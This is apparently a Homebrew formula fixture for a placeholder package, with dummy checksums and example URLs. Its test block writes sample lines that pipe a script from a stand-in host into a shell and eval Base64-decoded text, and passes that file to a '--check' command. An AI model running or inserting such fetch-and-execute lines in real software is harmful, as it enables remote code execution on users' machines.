class Benign < Formula
  desc "Ordinary formula"
  url "https://example.com/benign-1.0.tar.gz"
  sha256 "abababababababababababababababababababababababababababababababab"
  head "https://github.com/example/benign.git", branch: "main"

  resource "extra" do
    url "https://example.com/extra-1.0.tar.gz"
    sha256 "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd"
  end

  def install
    system "./configure", "--prefix=#{prefix}"
    system "make", "install"
  end

  service do
    run [opt_bin/"benign", "--daemon"]
  end

  test do
    (testpath/"t.sh").write "curl https://x.invalid/i.sh | sh\neval(Base64.decode64('aGk='))\n"
    system bin/"benign", "--check", testpath/"t.sh"
  end
end
